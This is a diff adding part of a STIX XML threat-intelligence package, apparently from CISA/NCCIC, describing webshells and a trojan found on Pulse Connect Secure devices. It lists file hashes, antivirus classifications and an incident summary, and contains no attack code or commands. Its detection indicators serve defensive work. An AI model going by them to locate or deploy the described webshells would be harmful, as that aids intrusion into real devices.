+                <stixCommon:TTP idref="NCCIC:ttp-feb241a5-863f-419b-8e4b-c23002c6646e" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-57ad48f8-1c81-437a-806e-a3c6defb3ddf" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-07-14T16:34:40+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-a88f2fb7-a5a6-4180-80f1-64707ad777af" timestamp="2021-07-14T16:34:40.126440+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>MD5 and SHA1 of Malicious File</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-e434e0b1-213e-444d-b74f-3251d62615ce">
+                <cybox:Object id="NCCIC:File-b4a651a5-e165-4502-a0e4-bca6a380e1ee">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">a0ce730cffc65e6950c6a5d1d2de0ebb</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">620bfbc94296271c3c6d71b97a8b5486d63347b3</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">bef423bd85a25d14ffa511a0e04194e59b283057bd41689d473f79d227942c98</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-57ad48f8-1c81-437a-806e-a3c6defb3ddf" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-07-14T16:34:40+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+    </stix:Indicators>
+    <stix:TTPs>
+        <stix:TTP id="NCCIC:ttp-a9204089-4440-4f76-988b-c6259b1bc0f1" timestamp="2021-07-14T16:34:39.835774+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>MAEC Characterization of d855ebd2adeaf2b3c87b28e77e9ce4d4</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-42496f6e-4c04-41fd-8cf6-d25f249284cf" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-c37db0f1-a4c0-4acc-aa6d-440e92dcf479">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-f55a890f-0056-4579-ac3e-f255c74b2b12"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-9200cf55-c24b-4314-99b9-f129a94be718" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>ClamAV</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Unix.Trojan.ATRIUM-9855919-0</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-2799ba95-e346-4186-87d7-de85a4834685">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-b93b24b2-d9f0-4d81-8ad3-17c3a4ea466d" timestamp="2021-07-14T16:34:39.856695+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>trojan</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-2799ba95-e346-4186-87d7-de85a4834685">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-57ad48f8-1c81-437a-806e-a3c6defb3ddf" timestamp="2021-07-14T16:34:39.857206+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>webshell</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-2799ba95-e346-4186-87d7-de85a4834685">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-e900cfcf-e883-43fd-ac8f-429816cb9199">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-3c501507-00c2-489b-ac5e-860091abfd4c">
+                        </cybox:Observable>
+                        <cybox:Observable idref="NCCIC:Observable-27596cc4-1ebf-4a71-a7d7-778c5001b297">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-feb241a5-863f-419b-8e4b-c23002c6646e" timestamp="2021-07-14T16:34:40.017207+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>MAEC Characterization of f23e94a38f0a93df46ba83786f3180e0</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-ea684c12-d675-49f4-b86f-fbcbe1d50d2e" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-dbca5b40-e1ae-4f58-ab59-2bda0756819b">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-e0506417-6bb3-4822-aa94-f6c39951c657"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-622e964c-2bfa-4af3-a0ac-da61bc10b281" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Symantec</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Hacktool.Webshell</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-3c501507-00c2-489b-ac5e-860091abfd4c">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+    </stix:TTPs>
+    <stix:Incidents>
+        <stix:Incident id="NCCIC:incident-9bf6068b-e662-4f3f-a0d2-8ec3f1f6c2b9" timestamp="2021-04-27T11:23:08-04:00" xsi:type='incident:IncidentType'>
+            <incident:Title>10333243.r1.v1</incident:Title>
+            <incident:Description><![CDATA[##### Incident Summary #####
+
+None
+
+##### Report Summary #####
+
+Four (4) files were submitted to CISA for analysis related to Pulse Secure Perl Common Gateway Interface (CGI) exploit. The files contain webshells or are designed to propagate shells that allow for remote code execution or unauthorized access. This analysis is derived from malicious files found on Pulse Connect Secure devices.
+
+##### Conclusion #####
+
+None
+
+##### Mitigation #####
+
+None]]></incident:Description>
+            <incident:Categories>
+                <incident:Category xsi:type="stixVocabs:IncidentCategoryVocab-1.0">Malicious Code</incident:Category>
+            </incident:Categories>
+            <incident:Related_Indicators>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-ba0edbfc-5b48-4cb2-9292-7ee3d60ac23b" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-d979953a-c9d2-44cf-9551-bd0e0a5c46ea" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-52177634-1ffa-49aa-979a-bb82a2167492" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-a88f2fb7-a5a6-4180-80f1-64707ad777af" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+            </incident:Related_Indicators>
+            <incident:Related_Observables>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-2799ba95-e346-4186-87d7-de85a4834685">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-e900cfcf-e883-43fd-ac8f-429816cb9199">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-3c501507-00c2-489b-ac5e-860091abfd4c">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-27596cc4-1ebf-4a71-a7d7-778c5001b297">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+            </incident:Related_Observables>
+            <incident:Leveraged_TTPs>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-a9204089-4440-4f76-988b-c6259b1bc0f1" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-b93b24b2-d9f0-4d81-8ad3-17c3a4ea466d" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-57ad48f8-1c81-437a-806e-a3c6defb3ddf" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-feb241a5-863f-419b-8e4b-c23002c6646e" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+            </incident:Leveraged_TTPs>
+        </stix:Incident>
+    </stix:Incidents>
+</stix:STIX_Package>
